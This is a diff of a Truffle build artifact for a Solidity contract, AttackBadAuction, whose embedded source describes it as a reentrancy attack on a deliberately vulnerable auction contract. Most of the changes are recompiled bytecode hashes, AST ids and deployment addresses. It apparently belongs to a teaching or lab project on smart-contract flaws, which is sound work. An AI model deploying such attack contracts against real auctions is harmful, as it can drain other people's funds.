@@ -60,8 +60,8 @@
       "type": "function"
     }
   ],
-  "bytecode": "0x608060405234801561001057600080fd5b5060405160208061024b8339810160405251600160a060020a038116151561009957604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f696e76616c69642061756374696f6e20636f6e74726163742061646472657373604482015290519081900360640190fd5b60008054600160a060020a03909216600160a060020a0319909216919091179055610182806100c96000396000f30060806040526004361061004b5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166312065fe08114610105578063c0a62e441461011c575b604080516001815290517f7c9ca5e15ab6228910d4cfb7630c028e7761c571330510d3bfd2177e5129ff619181900360200190a160008054604080517f1998aeef000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff90921692631998aeef923492600480820193929182900301818588803b1580156100ea57600080fd5b505af11580156100fe573d6000803e3d6000fd5b5050505050005b34801561011157600080fd5b5061011a610120565b005b61011a5b604080513031815290517fe8d947d7ebdd7b8b8fa2ad2022c7591418ac32d8c29c5f8a8fc9de52ffa540929181900360200190a15600a165627a7a7230582043df1c038a5eae23fb2b05a8c86d1a26423e84a9c50386bf0eaa8959299ba71a0029",
-  "deployedBytecode": "0x60806040526004361061004b5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166312065fe08114610105578063c0a62e441461011c575b604080516001815290517f7c9ca5e15ab6228910d4cfb7630c028e7761c571330510d3bfd2177e5129ff619181900360200190a160008054604080517f1998aeef000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff90921692631998aeef923492600480820193929182900301818588803b1580156100ea57600080fd5b505af11580156100fe573d6000803e3d6000fd5b5050505050005b34801561011157600080fd5b5061011a610120565b005b61011a5b604080513031815290517fe8d947d7ebdd7b8b8fa2ad2022c7591418ac32d8c29c5f8a8fc9de52ffa540929181900360200190a15600a165627a7a7230582043df1c038a5eae23fb2b05a8c86d1a26423e84a9c50386bf0eaa8959299ba71a0029",
+  "bytecode": "0x608060405234801561001057600080fd5b5060405160208061024b8339810160405251600160a060020a038116151561009957604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f696e76616c69642061756374696f6e20636f6e74726163742061646472657373604482015290519081900360640190fd5b60008054600160a060020a03909216600160a060020a0319909216919091179055610182806100c96000396000f30060806040526004361061004b5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166312065fe08114610105578063c0a62e441461011c575b604080516001815290517f7c9ca5e15ab6228910d4cfb7630c028e7761c571330510d3bfd2177e5129ff619181900360200190a160008054604080517f1998aeef000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff90921692631998aeef923492600480820193929182900301818588803b1580156100ea57600080fd5b505af11580156100fe573d6000803e3d6000fd5b5050505050005b34801561011157600080fd5b5061011a610120565b005b61011a5b604080513031815290517fe8d947d7ebdd7b8b8fa2ad2022c7591418ac32d8c29c5f8a8fc9de52ffa540929181900360200190a15600a165627a7a723058205ce7c533d792ded8f9aa08a80c3f0cff5c33e4b44fff61f2e2458bbb112ba8be0029",
+  "deployedBytecode": "0x60806040526004361061004b5763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166312065fe08114610105578063c0a62e441461011c575b604080516001815290517f7c9ca5e15ab6228910d4cfb7630c028e7761c571330510d3bfd2177e5129ff619181900360200190a160008054604080517f1998aeef000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff90921692631998aeef923492600480820193929182900301818588803b1580156100ea57600080fd5b505af11580156100fe573d6000803e3d6000fd5b5050505050005b34801561011157600080fd5b5061011a610120565b005b61011a5b604080513031815290517fe8d947d7ebdd7b8b8fa2ad2022c7591418ac32d8c29c5f8a8fc9de52ffa540929181900360200190a15600a165627a7a723058205ce7c533d792ded8f9aa08a80c3f0cff5c33e4b44fff61f2e2458bbb112ba8be0029",
   "sourceMap": "214:702:0:-;;;349:238;8:9:-1;5:2;;;30:1;27;20:12;5:2;349:238:0;;;;;;;;;;;;;-1:-1:-1;;;;;461:32:0;;;;453:77;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;540:7;:40;;-1:-1:-1;;;;;540:40:0;;;-1:-1:-1;;;;;;540:40:0;;;;;;;;;214:702;;;;;;",
   "deployedSourceMap": "214:702:0:-;;;;;;;;;;;;;;;;;;;;;;;;;721:11;;;730:1;721:11;;;;;;;;;;;;;742:7;;;:30;;;;;;;;:7;;;;;:11;;760:9;;742:30;;;;;:7;:30;;;;;;760:9;742:7;:30;;;5:2:-1;;;;30:1;27;20:12;5:2;742:30:0;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;742:30:0;;;;;214:702;593:81;;8:9:-1;5:2;;;30:1;27;20:12;5:2;593:81:0;;;;;;785:129;;593:81;637:30;;;653:4;645:21;637:30;;;;;;;;;;;;;593:81::o",
   "source": "pragma solidity ^0.4.25;\n\nimport './BadAuction.sol';\n\n/**\n@title Auction reentrancy attack\n@author Ahmed Ali <ahmedaabdulwahed@gmail.com>\nThis contract meant to be a reentrancy attack for\nthe auction contract\n**/\n\ncontract AttackBadAuction {\n    BadAuction private auction;\n\n    event Balance(uint256 value);\n    event Balance2(uint256 value);\n\n    constructor(address _badAuctionAddress) public {\n        // create new instance of the contract\n        require(_badAuctionAddress != address(0), 'invalid auction contract address');\n        auction = BadAuction(_badAuctionAddress);\n    }\n\n    function getBalance() public {\n        emit Balance(address(this).balance);\n    }\n\n    function () public payable{\n        emit Balance2(1);\n        auction.bid.value(msg.value)();\n    }\n\n    function attackAuction() public payable{\n        auction.bid.value(msg.value);\n        emit Balance(address(this).balance);\n    }\n}",
@@ -93,7 +93,7 @@
         "id": 2,
         "nodeType": "ImportDirective",
         "scope": 84,
-        "sourceUnit": 129,
+        "sourceUnit": 160,
         "src": "26:26:0",
         "symbolAliases": [],
         "unitAlias": ""
@@ -121,7 +121,7 @@
             "stateVariable": true,
             "storageLocation": "default",
             "typeDescriptions": {
-              "typeIdentifier": "t_contract$_BadAuction_$128",
+              "typeIdentifier": "t_contract$_BadAuction_$159",
               "typeString": "contract BadAuction"
             },
             "typeName": {
@@ -129,10 +129,10 @@
               "id": 3,
               "name": "BadAuction",
               "nodeType": "UserDefinedTypeName",
-              "referencedDeclaration": 128,
+              "referencedDeclaration": 159,
               "src": "246:10:0",
               "typeDescriptions": {
-                "typeIdentifier": "t_contract$_BadAuction_$128",
+                "typeIdentifier": "t_contract$_BadAuction_$159",
                 "typeString": "contract BadAuction"
               }
             },
@@ -355,10 +355,10 @@
                       "name": "require",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [
-                        203,
-                        204
+                        265,
+                        266
                       ],
-                      "referencedDeclaration": 204,
+                      "referencedDeclaration": 266,
                       "src": "453:7:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
@@ -400,7 +400,7 @@
                       "referencedDeclaration": 4,
                       "src": "540:7:0",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_BadAuction_$128",
+                        "typeIdentifier": "t_contract$_BadAuction_$159",
                         "typeString": "contract BadAuction"
                       }
                     },
@@ -434,10 +434,10 @@
                         "name": "BadAuction",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 128,
+                        "referencedDeclaration": 159,
                         "src": "550:10:0",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_type$_t_contract$_BadAuction_$128_$",
+                          "typeIdentifier": "t_type$_t_contract$_BadAuction_$159_$",
                           "typeString": "type(contract BadAuction)"
                         }
                       },
@@ -451,13 +451,13 @@
                       "nodeType": "FunctionCall",
                       "src": "550:30:0",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_BadAuction_$128",
+                        "typeIdentifier": "t_contract$_BadAuction_$159",
                         "typeString": "contract BadAuction"
                       }
                     },
                     "src": "540:40:0",
                     "typeDescriptions": {
-                      "typeIdentifier": "t_contract$_BadAuction_$128",
+                      "typeIdentifier": "t_contract$_BadAuction_$159",
                       "typeString": "contract BadAuction"
                     }
                   },
@@ -542,7 +542,7 @@
                               "name": "this",
                               "nodeType": "Identifier",
                               "overloadedDeclarations": [],
-                              "referencedDeclaration": 215,
+                              "referencedDeclaration": 277,
                               "src": "653:4:0",
                               "typeDescriptions": {
                                 "typeIdentifier": "t_contract$_AttackBadAuction_$83",
@@ -744,7 +744,7 @@
                             "name": "msg",
                             "nodeType": "Identifier",
                             "overloadedDeclarations": [],
-                            "referencedDeclaration": 200,
+                            "referencedDeclaration": 262,
                             "src": "760:3:0",
                             "typeDescriptions": {
                               "typeIdentifier": "t_magic_message",
@@ -784,7 +784,7 @@
                             "referencedDeclaration": 4,
                             "src": "742:7:0",
                             "typeDescriptions": {
-                              "typeIdentifier": "t_contract$_BadAuction_$128",
+                              "typeIdentifier": "t_contract$_BadAuction_$159",
                               "typeString": "contract BadAuction"
                             }
                           },
@@ -795,7 +795,7 @@
                           "lValueRequested": false,
                           "memberName": "bid",
                           "nodeType": "MemberAccess",
-                          "referencedDeclaration": 127,
+                          "referencedDeclaration": 158,
                           "src": "742:11:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_function_external_payable$__$returns$__$",
@@ -895,7 +895,7 @@
                           "name": "msg",
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
-                          "referencedDeclaration": 200,
+                          "referencedDeclaration": 262,
                           "src": "852:3:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_magic_message",
@@ -935,7 +935,7 @@
                           "referencedDeclaration": 4,
                           "src": "834:7:0",
                           "typeDescriptions": {
-                            "typeIdentifier": "t_contract$_BadAuction_$128",
+                            "typeIdentifier": "t_contract$_BadAuction_$159",
                             "typeString": "contract BadAuction"
                           }
                         },
@@ -946,7 +946,7 @@
                         "lValueRequested": false,
                         "memberName": "bid",
                         "nodeType": "MemberAccess",
-                        "referencedDeclaration": 127,
+                        "referencedDeclaration": 158,
                         "src": "834:11:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_function_external_payable$__$returns$__$",
@@ -1000,7 +1000,7 @@
                               "name": "this",
                               "nodeType": "Identifier",
                               "overloadedDeclarations": [],
-                              "referencedDeclaration": 215,
+                              "referencedDeclaration": 277,
                               "src": "893:4:0",
                               "typeDescriptions": {
                                 "typeIdentifier": "t_contract$_AttackBadAuction_$83",
@@ -1156,7 +1156,7 @@
         "id": 2,
         "nodeType": "ImportDirective",
         "scope": 84,
-        "sourceUnit": 129,
+        "sourceUnit": 160,
         "src": "26:26:0",
         "symbolAliases": [],
         "unitAlias": ""
@@ -1184,7 +1184,7 @@
             "stateVariable": true,
             "storageLocation": "default",
             "typeDescriptions": {
-              "typeIdentifier": "t_contract$_BadAuction_$128",
+              "typeIdentifier": "t_contract$_BadAuction_$159",
               "typeString": "contract BadAuction"
             },
             "typeName": {
@@ -1192,10 +1192,10 @@
               "id": 3,
               "name": "BadAuction",
               "nodeType": "UserDefinedTypeName",
-              "referencedDeclaration": 128,
+              "referencedDeclaration": 159,
               "src": "246:10:0",
               "typeDescriptions": {
-                "typeIdentifier": "t_contract$_BadAuction_$128",
+                "typeIdentifier": "t_contract$_BadAuction_$159",
                 "typeString": "contract BadAuction"
               }
             },
@@ -1418,10 +1418,10 @@
                       "name": "require",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [
-                        203,
-                        204
+                        265,
+                        266
                       ],
-                      "referencedDeclaration": 204,
+                      "referencedDeclaration": 266,
                       "src": "453:7:0",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
@@ -1463,7 +1463,7 @@
                       "referencedDeclaration": 4,
                       "src": "540:7:0",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_BadAuction_$128",
+                        "typeIdentifier": "t_contract$_BadAuction_$159",
                         "typeString": "contract BadAuction"
                       }
                     },
@@ -1497,10 +1497,10 @@
                         "name": "BadAuction",
                         "nodeType": "Identifier",
                         "overloadedDeclarations": [],
-                        "referencedDeclaration": 128,
+                        "referencedDeclaration": 159,
                         "src": "550:10:0",
                         "typeDescriptions": {
-                          "typeIdentifier": "t_type$_t_contract$_BadAuction_$128_$",
+                          "typeIdentifier": "t_type$_t_contract$_BadAuction_$159_$",
                           "typeString": "type(contract BadAuction)"
                         }
                       },
@@ -1514,13 +1514,13 @@
                       "nodeType": "FunctionCall",
                       "src": "550:30:0",
                       "typeDescriptions": {
-                        "typeIdentifier": "t_contract$_BadAuction_$128",
+                        "typeIdentifier": "t_contract$_BadAuction_$159",
                         "typeString": "contract BadAuction"
                       }
                     },
                     "src": "540:40:0",
                     "typeDescriptions": {
-                      "typeIdentifier": "t_contract$_BadAuction_$128",
+                      "typeIdentifier": "t_contract$_BadAuction_$159",
                       "typeString": "contract BadAuction"
                     }
                   },
@@ -1605,7 +1605,7 @@
                               "name": "this",
                               "nodeType": "Identifier",
                               "overloadedDeclarations": [],
-                              "referencedDeclaration": 215,
+                              "referencedDeclaration": 277,
                               "src": "653:4:0",
                               "typeDescriptions": {
                                 "typeIdentifier": "t_contract$_AttackBadAuction_$83",
@@ -1807,7 +1807,7 @@
                             "name": "msg",
                             "nodeType": "Identifier",
                             "overloadedDeclarations": [],
-                            "referencedDeclaration": 200,
+                            "referencedDeclaration": 262,
                             "src": "760:3:0",
                             "typeDescriptions": {
                               "typeIdentifier": "t_magic_message",
@@ -1847,7 +1847,7 @@
                             "referencedDeclaration": 4,
                             "src": "742:7:0",
                             "typeDescriptions": {
-                              "typeIdentifier": "t_contract$_BadAuction_$128",
+                              "typeIdentifier": "t_contract$_BadAuction_$159",
                               "typeString": "contract BadAuction"
                             }
                           },
@@ -1858,7 +1858,7 @@
                           "lValueRequested": false,
                           "memberName": "bid",
                           "nodeType": "MemberAccess",
-                          "referencedDeclaration": 127,
+                          "referencedDeclaration": 158,
                           "src": "742:11:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_function_external_payable$__$returns$__$",
@@ -1958,7 +1958,7 @@
                           "name": "msg",
                           "nodeType": "Identifier",
                           "overloadedDeclarations": [],
-                          "referencedDeclaration": 200,
+                          "referencedDeclaration": 262,
                           "src": "852:3:0",
                           "typeDescriptions": {
                             "typeIdentifier": "t_magic_message",
@@ -1998,7 +1998,7 @@
                           "referencedDeclaration": 4,
                           "src": "834:7:0",
                           "typeDescriptions": {
-                            "typeIdentifier": "t_contract$_BadAuction_$128",
+                            "typeIdentifier": "t_contract$_BadAuction_$159",
                             "typeString": "contract BadAuction"
                           }
                         },
@@ -2009,7 +2009,7 @@
                         "lValueRequested": false,
                         "memberName": "bid",
                         "nodeType": "MemberAccess",
-                        "referencedDeclaration": 127,
+                        "referencedDeclaration": 158,
                         "src": "834:11:0",
                         "typeDescriptions": {
                           "typeIdentifier": "t_function_external_payable$__$returns$__$",
@@ -2063,7 +2063,7 @@
                               "name": "this",
                               "nodeType": "Identifier",
                               "overloadedDeclarations": [],
-                              "referencedDeclaration": 215,
+                              "referencedDeclaration": 277,
                               "src": "893:4:0",
                               "typeDescriptions": {
                                 "typeIdentifier": "t_contract$_AttackBadAuction_$83",
@@ -2206,10 +2206,16 @@
     "1541623660746": {
       "events": {},
       "links": {},
-      "address": "0x1231a5b2546d9ee964dde2e89f893286c361dd37",
-      "transactionHash": "0x189bec61c12f3bbead83a2fe7a45c123c53e7b400dd51119c30d35fd95e9bb77"
+      "address": "0xaeae30f49ae3b35c137392027e7e899b4759e04c",
+      "transactionHash": "0xa412820ce8129bc92624b4f542bca77a4849b1456dfe69bcc35c03f9600e39c9"
+    },
+    "1542014047084": {
+      "events": {},
+      "links": {},
+      "address": "0xaaa1105364a60896212ea1290ce300e89c6f68df",
+      "transactionHash": "0x930454ba19ac334ef03a755d3f199fd38aa8299b18f786a04512b48547badd62"
     }
   },
-  "schemaVersion": "3.0.0-beta.0",
-  "updatedAt": "2018-11-11T13:50:36.282Z"
+  "schemaVersion": "2.0.1",
+  "updatedAt": "2018-11-12T09:14:17.904Z"
 }
